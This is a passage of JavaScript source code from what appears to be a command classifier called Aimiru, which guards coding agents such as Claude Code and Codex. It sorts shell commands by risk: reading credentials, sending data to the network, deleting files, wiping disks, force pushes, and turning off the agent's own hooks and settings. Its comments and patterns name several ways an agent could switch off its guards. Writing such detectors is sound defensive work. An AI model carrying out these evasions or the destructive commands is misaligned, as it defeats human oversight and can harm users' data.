  const hooksText = namesHooksPath(out.seen.join('\n')) || (seg.redirects || []).some((r) => namesHooksPath(String(r.body ?? (r.op === '<<<' ? r.target : ''))));
  for (const step of guardRedirect(seg, ctx, hooksText)) incidentOrUnknown(out, step);
  for (const r of seg.redirects) {
    if (r.op === '<') {
      const p = resolvePathWord(r.target, ctx);
      if (isCredentialFile(p)) {
        out.classes.push('login');
        out.why.push(`reads a credential file: ${p}`);
      }
    }
  }
  if (!words.length) {
    // "... | sudo -s": an administrator shell that runs whatever it is given.
    if (elevated && seg.piped) unknownProgram(out, 'runs commands it reads from another program, as administrator');
    return;
  }
  if (elevated) {
    out.classes.push('write');
    out.why.push('runs as administrator');
  }
  // PowerShell: "$x = <command>" runs the command; "$x" alone only shows a value.
  if (ctx.powershell && words[0].startsWith('$')) {
    // $env:NAME = value sets a variable for later commands.
    const env = /^\$env:([A-Za-z_]\w*)(=(.*))?$/is.exec(words[0]);
    if (env && (env[2] || (words.length > 1 && (words[1] === '=' || words[1] === '+=')))) {
      const rest = env[2] ? [env[3], ...words.slice(1)] : words.slice(2);
      const restDynamic = env[2] ? /[$`]/.test(env[3]) || dynamic.slice(1).some(Boolean) : dynamic.slice(2).some(Boolean);
      variableSet(env[1].toUpperCase(), rest.join(' '), restDynamic, ctx, out, depth);
    }
    if (words.length > 1 && /^([-+*/%]|\?\?)?=$/.test(words[1])) {
      classifySegment({ words: words.slice(2), dynamic: dynamic.slice(2), expand: expand.slice(2), quoted: quoted.slice(2), redirects: [], piped: false }, ctx, out, depth);
      return;
    }
    const glued = /^\$[A-Za-z_][\w:]*=(.+)$/s.exec(words[0]);
    if (glued) {
      classifySegment({ words: [glued[1], ...words.slice(1)], dynamic: [/[$`]/.test(glued[1]), ...dynamic.slice(1)], expand: [false, ...expand.slice(1)], quoted: [false, ...quoted.slice(1)], redirects: [], piped: false }, ctx, out, depth);
      return;
    }
    // A plain variable is a value ("$f in $files", "$a + $b"); only "& $x" runs it.
    if (!seg.call && /^\$[A-Za-z_][\w:]*$/.test(words[0])) return;
  }
  // PowerShell: a quoted string, a number or @(...) at the start is a value, not a program
  // (only "& 'C:\\tools\\x.exe'" runs one).
  if (ctx.powershell && !seg.call && (quoted[0] || /^-?\d[\d.]*$/.test(words[0]) || words[0].startsWith('@'))) return;
  // A program named only when it runs ($CMD, $(...), `...`, a glob or brace list): Aimiru
  // cannot tell what it is, so it is never "read" (finding: "$CMD https://pay.example/charge").
  if (dynamic[0] || expand[0]) {
    unknownProgram(out, 'runs a program named only when it runs');
    return;
  }
  const prog = baseName(words[0]);
  const args = words.slice(1);
  const argDyn = dynamic.slice(1);
  const argExp = expand.slice(1);
  const argSub = (subst || []).slice(1);
  const lowerArgs = args.map((a) => a.toLowerCase());
  const joined = args.join(' ');

  // Removing, moving, emptying or turning off a git guard (ADR-0111): named before the program's
  // own reading, which counts the same step inside the project as local work.
  for (const step of guardShellStep(prog, args, argDyn, ctx, { argExp, argSub, hooksText, seg, out })) incidentOrUnknown(out, step);

  // "git $STEP", "stripe $CMD": what the program does is named only when it runs.
  if (prog !== 'git' && isSubcommandProgram(prog)) {
    const k = args.findIndex((a) => !a.startsWith('-'));
    if (k >= 0 && (argDyn[k] || argExp[k])) unknownProgram(out, `runs ${prog} with a step named only when it runs`);
  }
  // "... | xargs git", "... | xargs curl": the step or the address comes from another program.
  if (viaXargs && (NET_CLIENTS.has(prog) || ((prog === 'git' || isSubcommandProgram(prog)) && !args.some((a) => !a.startsWith('-'))))) {
    unknownProgram(out, `runs ${prog} with what another program gives it`);
  }

  // export NAME=value (declare, typeset, readonly, local): the variable holds for later commands.
  if (['export', 'declare', 'typeset', 'readonly', 'local'].includes(prog)) {
    // export, and declare/typeset/local with -x, pass the variable to every later program.
    const exported = prog === 'export' || args.some((a) => /^-[A-Za-z]*x/.test(a));
    args.forEach((a, k) => {
      if (ASSIGNMENT_RE.test(a)) {
        variableSet(variableName(a), a.slice(a.indexOf('=') + 1), argDyn[k], ctx, out, depth, { exported });
        noteShellValue(out, variableName(a), a.slice(a.indexOf('=') + 1), argDyn[k]);
      }
      else if (exported && /^[A-Za-z_]\w*$/.test(a) && a !== 'PATH') variableSet(a, '', false, ctx, out, depth, { exported }); // export NAME
    });
    return;
  }

  // alias name='command': the name runs that command from now on.
  if (prog === 'alias') {
    args.forEach((a, k) => {
      const eq = a.indexOf('=');
      if (eq > 0) classifyCommandText(a.slice(eq + 1), argDyn[k], ctx, out, depth);
    });
    return;
  }
  // trap 'command' SIGNAL: the command runs later, when the signal comes.
  if (prog === 'trap') {
    const k = args.findIndex((a) => !a.startsWith('-'));
    if (k >= 0 && args.length > k + 1) classifyCommandText(args[k], argDyn[k], ctx, out, depth);
    return;
  }
  // set: shell options in bash (set -euo pipefail), a variable in fish (set -gx NAME value).
  if (prog === 'set') {
    let k = 0;
    let exported = false;
    let allexport = null;
    while (k < args.length && /^[-+]/.test(args[k])) {
      const a = args[k];
      if (a === '--') return; // bash: set -- a b sets the arguments, not variables
      if (/^-[A-Za-z]*x/.test(a) || a === '--export') exported = true;
      if (/^[-+][A-Za-z]*a/.test(a)) allexport = a[0] === '-'; // bash: set -a exports every later assignment
      if (/^[-+][A-Za-z]*o$/.test(a) && args[k + 1] === 'allexport') allexport = a[0] === '-';
      k += /^[-+][A-Za-z]*o$/.test(a) ? 2 : 1;
    }
    if (k < args.length && /^[A-Za-z_]\w*$/.test(args[k])) {
      // fish: set [-gx] NAME value (fish's -a appends to the variable).
      variableSet(args[k], args.slice(k + 1).join(' '), argDyn.slice(k + 1).some(Boolean), ctx, out, depth, { exported: exported || ctx.allexport === true });
    } else if (allexport !== null) ctx.allexport = allexport;
    return;
  }
  // PowerShell: Set-Item env:NAME value (and New-Item, Set-Content, Add-Content on env:).
  if (['set-item', 'si', 'new-item', 'ni', 'set-content', 'sc', 'add-content', 'ac'].includes(prog)) {
    const named = {};
    const positional = [];
    for (let k = 0; k < args.length; k += 1) {
      const a = args[k];
      if (/^-(path|literalpath|value|name|itemtype|type|force|confirm|whatif|passthru)$/i.test(a)) {
        if (/^-(force|confirm|whatif|passthru)$/i.test(a)) continue;
        named[a.slice(1).toLowerCase()] = { w: args[k + 1], dyn: argDyn[k + 1] };
        k += 1;
      } else if (!a.startsWith('-')) positional.push({ w: a, dyn: argDyn[k] });
    }
    const target = named.path || named.literalpath || positional[0];
    const env = /^env:\\?([A-Za-z_]\w*)$/i.exec(target?.w ?? '');
    if (env) {
      const value = named.value || (named.path || named.literalpath ? positional[0] : positional[1]);
      variableSet(env[1].toUpperCase(), value?.w ?? '', Boolean(value?.dyn), ctx, out, depth);
      return;
    }
  }

  // cd changes where later relative paths point.
  if (['cd', 'pushd', 'set-location', 'sl', 'chdir'].includes(prog)) {
    const target = nonFlags(args)[0];
    if (!target || target === '~') {
      ctx.cwd = ctx.home;
      ctx.cwdUnknown = false;
    } else if (target === '-') ctx.cwdUnknown = true;
    else {
      const dyn = argDyn[args.indexOf(target)];
      let p = dyn ? null : resolvePathWord(target, ctx);
      if (dyn) {
        // cd "$HOME/Documents" goes where cd ~/Documents goes. Into the work area it stays
        // unknown, so a step after it is never counted as local work through $HOME.
        const home = homePathWord(target, ctx);
        if (home && !isInsideWorkArea(home, ctx)) p = home;
      }
      if (p) {
        ctx.cwd = p;
        ctx.cwdUnknown = false;
      } else ctx.cwdUnknown = true;
    }
    return;
  }
  if (['open', 'xdg-open', 'start', 'start-process'].includes(prog) && urlsIn(joined).length) {
    out.classes.push('other');
    out.counterparty = out.counterparty || counterpartyOf(urlsIn(joined)[0]);
    return;
  }

  // Nested shells: classify the commands they run, from -c, a here-document, a here-string or a pipe.
  // source and . run a script in this shell.
  if (SHELLS.has(prog) || prog === 'powershell' || prog === 'pwsh' || prog === 'cmd' || prog === 'source' || prog === '.') {
    const ps = prog === 'powershell' || prog === 'pwsh';
    const how = ps
      ? powershellInvocation(args, argDyn)
      : prog === 'cmd'
        ? cmdInvocation(args, argDyn)
        : prog === 'source' || prog === '.'
          ? (args.length ? { ...scriptSource(args[0]), operand: args[0], operandDynamic: Boolean(argDyn[0]) } : { none: true })
          : posixShellInvocation(args, argDyn);
    const inner = withDialect(ctx, ps);
    const stdin = stdinText(seg);
    if (how.text != null) {
      classifyCommandText(how.text, how.dynamic, inner, out, depth);
      return;
    }
    if (how.stdin) {
      if (stdin) classifyCommandText(stdin.text, stdin.dynamic, inner, out, depth);
      else if (inputRedirected(seg)) unknownProgram(out, 'runs commands it reads from another program or a file');
    } else if (how.fd) unknownProgram(out, 'runs commands another program writes');
    else if (how.script && (stdin || inputRedirected(seg))) {
      // A script given input can read its commands from that input; Aimiru cannot see which.
      unknownProgram(out, 'runs a script with input from another program');
    } else if (how.script && !insideProject(how.operand, how.operandDynamic, ctx)) {
      unknownProgram(out, 'runs a script from outside the project');
    } else if (how.script) {
      // A project script on its own: local work (spec §8.1) when it is in the last commit (ADR-0090).
      noteProgram(out, how.operand, how.operandDynamic, ctx);
    }
    return;
  }
  if (EVAL_PROGRAMS.has(prog)) {
    if (args.length) classifyCommandText(args.join(' '), argDyn.some(Boolean), withDialect(ctx, prog === 'eval' ? Boolean(ctx.powershell) : true), out, depth);
    else if (seg.piped) unknownProgram(out, 'runs commands it reads from another program');
    return;
  }
  if (prog === 'watch') {
    // watch [options] command...: runs the command through sh -c, again and again.
    let k = 0;
    while (k < args.length && args[k].startsWith('-')) {
      if (args[k] === '--') {
        k += 1;
        break;
      }
      k += /^(-n|--interval|-q|--equexit)$/.test(args[k]) ? 2 : 1;
    }
    if (k < args.length) classifyCommandText(args.slice(k).join(' '), argDyn.slice(k).some(Boolean), ctx, out, depth);
    return;
  }

  // Anything that turns Aimiru or Claude Code's guards off: a change to the maker's settings (the
  // protected-paths row). A program that only searches or shows text naming the setting changes nothing.
  // Aimiru's Codex setup program run directly ("aimiru-codex uninstall", a global install) rewrites
  // or removes Codex's check; through npx, bunx and the like, classifyPackageRun reads it.
  if (changesAimiruSetup(prog, args, argDyn)) protectedChange(out, "changes Aimiru's check in Codex");
  if ((/disableallhooks/i.test(joined) && !SHOWS_TEXT_ONLY.has(prog)) || (prog === 'claude' && hasSeq(args, ['plugin']) && /\b(disable|uninstall|remove)\b/.test(lowerArgs.join(' ')))) {
    protectedChange(out, 'changes Claude Code settings so its guards stop');
  }

  // Network clients: method and host decide the class. Payments, messages and DELETE first, as
  // before; then the rule for data leaving (ADR-0146): a request that carries data is share with its
  // host (sent to this computer only, other as before), and a plain read is read with net.get.
  if (NET_CLIENTS.has(prog) || (prog === 'curl.exe')) {
    const urls = args.filter((a) => /^(https?|wss?):\/\//i.test(a)).concat(urlsIn(joined));
    const method = httpMethodOf(prog, args);
    let cls = 'other';
    let cloud = false;
    for (const u of urls) {
      out.counterparty = out.counterparty || counterpartyOf(u);
      if (isPaymentHost(hostOf(u)) && method !== 'GET') cls = strongest(cls, 'spend');
      else if (isMessageUrl(u) && method !== 'GET') cls = strongest(cls, 'send');
      else if (hostOf(u) === 'api.github.com' && method !== 'GET') cls = strongest(cls, method === 'DELETE' ? 'delete' : 'send');
      else if (method === 'DELETE') {
        cls = strongest(cls, 'delete');
        // A DELETE request to a cloud provider's address deletes cloud data (ADR-0090).
        if (isCloudHost(hostOf(u)) && !/[$`]/.test(u)) cloud = true;
      }
    }
    const req = dataLeaves(prog, args, { dynamic: argDyn, fed: inputRedirected(seg), powershell: ctx.powershell === true });
    // A request to an address named only when it runs ("$URL", "https://$HOST/...") is share with
    // no host, held when Aimiru cannot be asked: the host could take payments.
    if (cls === 'other') cls = webRequestClass(out, req);
    if (cls === 'spend') out.resource = out.resource || 'money.card';
    if (cls === 'delete' && cloud) out.cloudDeletes += 1;
    if (cls !== 'share') out.classes.push(cls);
    out.why.push(`${method} ${urls[0] || 'a web address'}`);
    // Where the answer is saved (-o, -O, --output, -OutFile) is a file this command writes, so a
    // program the command then runs from it is new (ADR-0090). Saved under a name taken from the
    // address (wget, curl -O, http --download), any program the command runs may be that file.
    classifyTargetsForWrite(req.saves.map((s) => s.value), req.saves.map((s) => s.dynamic), ctx, out);
    if (req.remoteNames) out.treeChanges = true;
    return;
  }

  if (INLINE_INTERPRETERS.has(prog)) {
    // The code is given on the command line, or it is a module, a script operand, the program's
    // own input ("-", /dev/stdin, none), or another program's output (/dev/fd/63 from <(...)).
    const program = interpreterProgram(prog, args, argDyn);
    if (program.unknown) {
      unknownProgram(out, program.unknown);
      return;
    }
    // Code loaded first (node -r, ruby -r, perl -M) and include folders: by a plain module name or
    // from the project; never an address (data:, file:, http:), never from outside.
    for (const l of program.loads) {
      const v = String(l.value ?? '');
      if (l.dynamic || /^[a-z][a-z0-9+.-]*:/i.test(v) || ((l.dir || /[\\/]|^[.~]/.test(v)) && !insideProject(v, false, ctx))) {
        unknownProgram(out, `loads code into ${prog} from outside the project`);
      } else if (!l.dir && /[\\/]|^\./.test(v)) {
        // node -r ./setup.js: a file of the project loaded first is a program too (ADR-0090).
        noteProgram(out, v, false, ctx, programKind(prog));
      }
    }
    const stdin = stdinText(seg);
    const fed = Boolean(stdin) || inputRedirected(seg);
    const operandAt = program.operandAt ?? -1;
    const operand = program.operand ?? (operandAt >= 0 ? args[operandAt] : undefined);
    const operandDynamic = program.operandDynamic ?? (operandAt >= 0 ? Boolean(argDyn[operandAt]) : false);
    const inline = program.code || null;
    // Code flags after the operand are read as code too.
    const codes = [inline, ...(operandAt >= 0 ? laterInlineCode(prog, args, argDyn, operandAt + 1) : [])].filter(Boolean);
    const source = inline || program.module != null ? {} : scriptSource(operand);
    const fromInput = source.stdin === true;
    // Checked whatever else the command line says: another program's output, or input used as code.
    if (source.fd || nonFlags(args).some(isProgramOutputPath)) unknownProgram(out, 'runs code another program writes');
    if (codes.some((c) => c.dynamic)) unknownProgram(out, 'runs code built only when it runs');
    if (fed && codes.some((c) => RUNS_PROGRAMS_RE.test(c.text))) unknownProgram(out, 'runs code that can run what another program gives it');
    if (fromInput && !stdin && inputRedirected(seg)) unknownProgram(out, 'runs code it reads from another program or a file');
    // Code given on the command line or fed on input (-c, -e, -r, --eval, -p, a here-document,
    // piped code) is always unknown: no reading of code is complete enough to call it harmless.
    if (codes.length || (fromInput && stdin)) unknownProgram(out, `runs code given to ${prog} directly`);
    if ((source.script || (program.module != null && !PYTHON_LOCAL_MODULES.has(program.module))) && fed) {
      // A script given input can read its code from that input; Aimiru cannot see which.
      unknownProgram(out, 'runs a script with input from another program');
    }
    if (source.script && typeof operand === 'string' && operand.startsWith('-') && operand !== '-') unknownProgram(out, 'runs a script named like an option');
    // deno run x.ts: a project file is a program, new or not, and deno may download what it
    // imports, so it stays "other" as before (pushed once the program is read, ADR-0090 review).
    if (prog === 'deno' && !codes.length && !(fromInput && stdin)) {
      const run = denoRunTarget(args, argDyn);
      if (run?.unknown) {
        unknownProgram(out, run.unknown);
        return;
      }
      if (run && run.operand !== undefined && !run.operandDynamic && !/^[a-z][a-z0-9+.-]*:/i.test(String(run.operand)) && insideProject(run.operand, false, ctx)) {
        for (const l of run.loads) {
          if (l.dynamic || /^[a-z][a-z0-9+.-]*:/i.test(l.value) || !insideProject(l.value, false, ctx)) unknownProgram(out, 'loads code into deno from outside the project');
          else noteProgram(out, l.value, false, ctx);
        }
        noteProgram(out, run.operand, false, ctx);
        out.programRunsOther = (out.programRunsOther || 0) + 1;
        out.why.push('runs a deno program, which may download what it imports');
        return;
      }
    }
    const code = fromInput && stdin ? `${joined}\n${stdin.text}` : joined;
    const reads = codes.length > 0 || (fromInput && Boolean(stdin));
    const urls = urlsIn(code);
    if (reads && mentionsProtectedPath(code, ctx)) {
      // python -c "open('.claude/settings.json','w')...": code that names Claude Code's or Aimiru's
      // own files can change them, which is how Aimiru would be turned off.
      protectedChange(out, 'runs code that names the agent\'s own settings or Aimiru\'s files');
    }
    if (reads || urls.length) {
      for (const u of urls) {
        out.counterparty = out.counterparty || counterpartyOf(u);
        if (isPaymentHost(hostOf(u))) out.classes.push('spend');
        else if (isMessageUrl(u)) out.classes.push('send');
        else out.classes.push('other');
      }
      if (/smtplib|sendmail|nodemailer|send_message|sendmessage/i.test(code)) out.classes.push('send');
      // Code given directly that names an address off this computer, or makes a network call with
      // none, can send data there (ADR-0146): share, held. It names no host: no reading of code is
      // complete, so a yes for that host must never let other code through; it is asked each time.
      if (reads && (urls.some((u) => !isLoopbackHost(hostOf(u))) || (!urls.length && NETWORK_CALL_RE.test(code)))) {
        sharesWith(out, null, { why: `runs code given to ${prog} directly that can send data to another computer` });
      }
      // perl -pi -e '...' files: the files are changed in place, read below.
      if (!(prog === 'perl' && args.some((a) => /^-[A-Za-z]*i/.test(a)))) return;
    } else if (prog !== 'bun' && prog !== 'deno' && !(prog === 'perl' && args.some((a) => /^-[A-Za-z]*i/.test(a)))) {
      // A project script (inside the project or a temp folder) or a known module is local work
      // (spec §8.1); a script from anywhere else is not known to be.
      if (program.module != null) {
        if (!PYTHON_LOCAL_MODULES.has(program.module)) unknownProgram(out, `runs the ${program.module} module`);
      } else if (source.script && !insideProject(operand, operandDynamic, ctx)) {
        unknownProgram(out, 'runs a script from outside the project');
      } else if (source.script && !(prog === 'node' && args.some((a) => /^--test(=|$)/.test(a)))) {
        // A project script is local work when it is in the last commit; one the agent wrote is
        // new (ADR-0090). node --test is a test runner, which stays local work.
        noteProgram(out, operand, operandDynamic, ctx, programKind(prog));
      }
      return;
    }
    // bun and deno subcommands, and perl -i, are read below.
  }

  // Deleting files.
  if (DELETERS.has(prog)) {
    const targets = [];
    const tdyn = [];
    args.forEach((a, k) => {
      if (a.startsWith('-') && !/^-{1,2}$/.test(a)) return;
      targets.push(a);
      tdyn.push(argDyn[k]);
    });
    let outside = viaXargs;
    // What xargs gives it is known only when the command runs.
    const reached = viaXargs ? [null] : [];
    if (viaXargs) out.why.push('deletes files it is given');
    targets.forEach((t, k) => {
      const p = tdyn[k] ? null : resolvePathWord(t, ctx);
      // The maker's settings or Aimiru's own files: a change to them, not the person's data.
      if (p && isProtectedPath(p, ctx)) {
        protectedChange(out, `deletes ${p}, the agent's own settings or Aimiru's files`);
        return;
      }
      // A folder that holds them: a change to them, and a deletion of whatever else it holds.
      if (p && holdsProtectedPath(p, ctx)) protectedChange(out, `deletes ${p}, which holds the agent's own settings or Aimiru's files`);
      if (!p || !isInsideWorkArea(p, ctx)) {
        outside = true;
        // "$HOME/Documents" names the person's files as "~/Documents" does; one that lands in the
        // work area stays unknown, so it is still asked about.
        const known = p || (tdyn[k] ? homePathWord(t, ctx) : null);
        reached.push(known && !isInsideWorkArea(known, ctx) ? known : null);
        out.why.push(`deletes outside the project: ${p || t}`);
      }
    });
    if (outside) deletesFiles(out, deleteKind(reached, ctx));
    return;
  }
  if (prog === 'find' && args.some((a) => a === '-delete' || /^-(exec|execdir|ok|okdir)$/.test(a))) {
    const roots = [];
    const rootPaths = [];
    /** A root written from $HOME, read only to say what it deletes (as for rm above). */
    const homeRoots = [];
    for (const [k, a] of args.entries()) {
      if (a.startsWith('-') || a === '(' || a === '!') break;
      roots.push(a);
      rootPaths.push(argDyn[k] ? null : resolvePathWord(a, ctx));
      homeRoots.push(argDyn[k] ? homePathWord(a, ctx) : null);
    }
    if (!roots.length) rootPaths.push(resolvePathWord('.', ctx));
    const outsideRoots = [];
    rootPaths.forEach((p, n) => {
      if (p && isInsideWorkArea(p, ctx)) return;
      const known = p || homeRoots[n] || null;
      outsideRoots.push(known && !isInsideWorkArea(known, ctx) ? known : null);
    });
    const anyOutside = outsideRoots.length > 0;
    // -exec ... ; runs a command for each file found: read that command too. {} is a found file:
    // inside the search folders when they are all in the project, otherwise unknown.
    for (let k = 0; k < args.length; k += 1) {
      if (!/^-(exec|execdir|ok|okdir)$/.test(args[k])) continue;
      let end = k + 1;
      while (end < args.length && args[end] !== ';' && args[end] !== '+') end += 1;
      const found = path.join(roots[0] || '.', 'found');
      const cmd = args.slice(k + 1, end);
      if (cmd.length) {
        classifySegment({
          words: cmd.map((w, n) => (n > 0 && !anyOutside ? w.replaceAll('{}', found) : w)),
          dynamic: cmd.map((w, n) => Boolean(argDyn[k + 1 + n]) || (w.includes('{}') && (n === 0 || anyOutside))),
          expand: argExp.slice(k + 1, end),
          redirects: [],
          piped: false,
        }, ctx, out, depth);
      }
      k = end;
    }
    const deletes = args.includes('-delete') || /\brm\b/.test(joined);
    // Searching the maker's settings or Aimiru's own files, or a folder that holds them, to delete
    // what it finds: a change to them.
    const settingsRoot = rootPaths.find((p) => p && (isProtectedPath(p, ctx) || holdsProtectedPath(p, ctx)));
    if (deletes && settingsRoot) protectedChange(out, `deletes files in ${settingsRoot}, the agent's own settings or Aimiru's files`);
    if (deletes && anyOutside && !(settingsRoot && rootPaths.every((p) => p && isProtectedPath(p, ctx)))) {
      deletesFiles(out, deleteKind(outsideRoots, ctx));
      out.why.push('deletes files outside the project');
    }
    return;
  }
  if (DISK_DESTROYERS.has(prog) || prog.startsWith('mkfs') || (prog === 'diskutil' && /^(erase|zero|partition|secureerase|reformat)/.test(firstNonFlag(args)))) {
    // What it erases: the disk or files it names, or unknown when one is named only when it runs.
    const erased = [];
    args.forEach((a, k) => {
      if (!a.startsWith('-')) erased.push(argDyn[k] ? null : resolvePathWord(a, ctx));
    });
    deletesFiles(out, erased.length ? deleteKind(erased, ctx) : 'data');
    out.why.push('erases a disk or file permanently');
    return;
  }
  if (prog === 'dd') {
    const of = args.find((a) => a.startsWith('of='));
    if (of) {
      const target = of.slice(3);
      if (target.startsWith('/dev/') && !/^\/dev\/(null|stdout|stderr)$/.test(target)) {
        deletesFiles(out, argDyn[args.indexOf(of)] ? 'unknown' : 'data');
        out.why.push(`overwrites ${target}`);
      } else classifyTargetsForWrite([target], null, ctx, out);
    }
    return;
  }

  // Sending, sharing, publishing.
  if (['sendmail', 'mail', 'mailx', 'mutt', 'neomutt', 'msmtp', 'swaks', 'ssmtp', 'send-mailmessage', 'aerc'].includes(prog)) {
    out.classes.push('send');
    out.resource = out.resource || 'message.email';
    out.why.push('sends an email');
    return;
  }
  if (prog === 'osascript') {
    if (/application\s+"?(messages|mail|outlook)"?/i.test(joined) && /\bsend\b/i.test(joined)) {
      out.classes.push('send');
      out.resource = /messages/i.test(joined) ? 'message.phone' : 'message.email';
      out.why.push('sends a message');
    } else if (/application\s+"?calendar"?/i.test(joined) && /make\s+new\s+event/i.test(joined)) {
      out.classes.push('book');
      out.why.push('adds a calendar event');
    } else if (!/^\s*(display (notification|dialog|alert)|beep|say)\b/i.test(nonFlags(args).join(' '))) {
      // AppleScript can drive any app: only notifications are known to stay local.
      unknownProgram(out, 'drives other apps with AppleScript');
    }
    return;
  }
  if (prog === 'twilio' && /messages:create|calls:create|api:core:messages/.test(lowerArgs.join(' '))) {
    out.classes.push('send');
    out.resource = 'message.phone';
    return;
  }
  if (prog === 'gcalcli' && /^(add|quick|import)$/.test(firstNonFlag(args))) {
    out.classes.push('book');
    return;
  }
  if (prog === 'git') {
    // git's own options come first: "git -C ../repo push" pushes.
    const g = gitInvocation(args, argDyn, ctx);
    for (const c of g.commands) classifyCommandText(c.text, c.dynamic, ctx, out, depth);
    if (g.hooks) {
      unknownProgram(out, 'runs git with hooks from another folder');
      nameIncidentStep(out, INCIDENT_RESOURCES.removeGuard, 'runs git with its guards taken from another folder (core.hooksPath)');
    }
    if (g.hidden) unknownProgram(out, 'runs git with settings this command does not show');
    let sub = g.sub;
    /** Words an alias adds after its step ("-c alias.p='push --force'"). */
    const aliasWords = [];
    // -c alias.x='!cmd' runs a command; -c alias.x=push is another name for push (and may chain).
    for (let hops = 0; g.aliases.has(sub); hops += 1) {
      const alias = g.aliases.get(sub);
      if (hops >= 8) {
        unknownProgram(out, 'runs git with a step named only when it runs');
        return;
      }
      if (alias.value.startsWith('!')) {
        classifyCommandText(alias.value.slice(1), alias.dynamic, ctx, out, depth);
        return;
      }
      if (alias.dynamic) unknownProgram(out, 'runs git with a step named only when it runs');
      const aliasParts = alias.value.trim().split(/\s+/);
      aliasWords.push(...aliasParts.slice(1));
      sub = (aliasParts[0] || '').toLowerCase();
    }
    if (g.subDynamic || argExp[g.index]) {
      unknownProgram(out, 'runs git with a step named only when it runs');
      return;
    }
    if (sub && !GIT_STEPS.has(sub)) {
      // An alias from a config file, or a git-<name> program: at least "other", held when Aimiru is down.
      unknownProgram(out, `runs "git ${sub}", which is not one of git's own steps`);
      return;
    }
    // A program this command runs after git changed the working folder may not be the committed one.
    if (GIT_TREE_STEPS.has(sub)) out.treeChanges = true;
    // A whole-tree discard or a step that skips the guards (ADR-0111), with an alias's own words first.
    const stepWords = [...aliasWords, ...args.slice(g.index + 1)];
    const stepDyn = [...aliasWords.map(() => false), ...argDyn.slice(g.index + 1)];
    const stepSub = [...aliasWords.map(() => []), ...argSub.slice(g.index + 1)];
    for (const step of gitIncidentSteps(sub, stepWords, stepDyn, ctx, stepSub, out.shellValues)) {
      if (step.protectedChange) protectedChange(out, step.why);
      else nameIncidentStep(out, step.resource, step.why);
    }
    if (sub === 'push') {
      out.classes.push(args.includes('--delete') || args.includes('-d') ? 'delete' : 'send');
      if (isForcePush([...args.slice(g.index + 1), ...aliasWords])) {
        nameBuilderStep(out, BUILDER_RESOURCES.forcePush);
        out.why.push('force pushes, which overwrites the shared copy');
      } else {
        // A plain push is code going where it always goes: "git push && git push -f" is still a
        // force push for the rules.
        codeStep(out);
        out.why.push('pushes code to a shared copy');
      }
      // Where it goes (CN7): the folder git runs in (git -C), unless settings given to git here can
      // change where a push goes (a remote's address, a url rewrite, the branch's remote) or another
      // repository's settings apply.
      let gitDir = ctx.cwdUnknown ? null : ctx.cwd;
      let pinned = !g.hidden;
      for (let k = 0; k < g.index; k += 1) {
        const a = args[k];
        if (a === '-C') {
          gitDir = gitDir && !argDyn[k + 1] ? path.resolve(gitDir, String(args[k + 1] ?? '').replace(/^~(?=$|\/)/, ctx.home)) : null;
          k += 1;
        } else if (/^--(git-dir|work-tree)(=|$)/.test(a) || a === '--bare') pinned = false;
        else if (a === '-c') {
          const key = String(args[k + 1] ?? '').split('=')[0].toLowerCase();
          if (argDyn[k + 1] || /^(remote|url|branch|push)\./.test(key)) pinned = false;
          k += 1;
        }
      }
      (out.pushes ||= []).push(pinned ? pushDestination(stepWords, stepDyn, gitDir) : { unknown: true });
      return;
    }
    if (['send-email', 'request-pull', 'imap-send', 'send-pack', 'http-push'].includes(sub)) {
      out.classes.push('send');
      return;
    }
    if (sub.startsWith('credential') || hasSeq(args, ['credential']) || /credential\.helper/.test(joined)) {
      out.classes.push('login');
      return;
    }
    const rest = args.slice(g.index + 1);
    const restDyn = argDyn.slice(g.index + 1);
    // Steps that run a command given on the command line.
    const runs = sub === 'rebase' ? flagValue(rest, ['-x', '--exec']) : sub === 'difftool' ? flagValue(rest, ['-x', '--extcmd']) : null;
    if (runs) classifyCommandText(runs, false, ctx, out, depth);
    if (sub === 'bisect' && rest[0] === 'run') classifyCommandText(rest.slice(1).join(' '), restDyn.slice(1).some(Boolean), ctx, out, depth);
    if (sub === 'submodule' && nonFlags(rest)[0] === 'foreach') {
      const k = rest.indexOf('foreach');
      classifyCommandText(rest.slice(k + 1).filter((a) => !a.startsWith('-')).join(' '), restDyn.slice(k + 1).some(Boolean), ctx, out, depth);
    }
    // A file git itself writes where the command says (--output, archive -o, format-patch -o, bundle
    // create): the maker's settings or Aimiru's files there, or a folder holding them, are a
    // protected change (security review, 28 Oct).
    for (const f of gitWrittenFiles(sub, rest, restDyn)) {
      const p = f.dyn ? null : resolvePathWord(f.word, ctx);
      if (p && (isProtectedPath(p, ctx) || holdsProtectedPath(p, ctx))) {
        if (!/disableallhooks/i.test(joined)) protectedChange(out, `writes ${p}, the agent's own settings or Aimiru's files`);
        return;
      }
    }
    if ((INSTALL_SUBCOMMANDS.git || []).includes(sub) || ['archimport', 'cvsimport', 'cvsexportcommit', 'svn', 'p4', 'http-fetch', 'fetch-pack'].includes(sub) || sub.startsWith('remote-') || (sub === 'archive' && rest.some((a) => /^--remote/.test(a)))) {
      out.classes.push('other');
      return;
    }
    if (sub === 'config') {
      // Settings that make git run commands, aliases and includes: what later git steps do changes.
      // The options that take the next word as their value (-f FILE, --type bool ...) are not the key.
      const setting = [];
      const settingDyn = [];
      for (let k = 0; k < rest.length; k += 1) {
        if (GIT_CONFIG_VALUE_OPTIONS.has(rest[k])) k += 1;
        else if (!rest[k].startsWith('-')) {
          setting.push(rest[k]);
          settingDyn.push(Boolean(restDyn[k]));
        }
      }
      const keyAt = ['set', 'add', 'unset', 'get', 'list', 'edit', 'rename-section', 'remove-section', 'get-regexp', 'get-urlmatch'].includes(setting[0]) ? 1 : 0;
      const key = (setting[keyAt] || '').toLowerCase();
      const sets = (setting[0] === 'set' || setting[0] === 'add') ? setting.length > 2 : keyAt === 0 && setting.length >= 2 && !rest.some((a) => /^--(get|get-all|get-regexp|list|unset|unset-all)$/.test(a) || a === '-l');
      // Changing where git takes its guards from turns the ones in .git/hooks off (ADR-0111): set
      // or unset, the whole core section removed or renamed, or a setting named only when the
      // command runs, which may be core.hooksPath ("git config "$K" /dev/null").
      const unsets = setting[0] === 'unset' || rest.some((a) => /^--(unset|unset-all)$/.test(a));
      const sections = setting[0] === 'remove-section' || setting[0] === 'rename-section' || rest.some((a) => /^--(remove|rename)-section$/.test(a));
      // A settings file given to git config (-f FILE, --file FILE): changing the maker's settings or
      // Aimiru's files that way is a protected change (git writes its own format there, which can
      // also stop a settings file from loading). Reading them changes nothing.
      if (sets || unsets || sections || rest.includes('--edit') || rest.includes('-e') || setting[0] === 'edit') {
        for (let k = 0; k < rest.length; k += 1) {
          const glued = /^--file=(.*)$/s.exec(rest[k]);
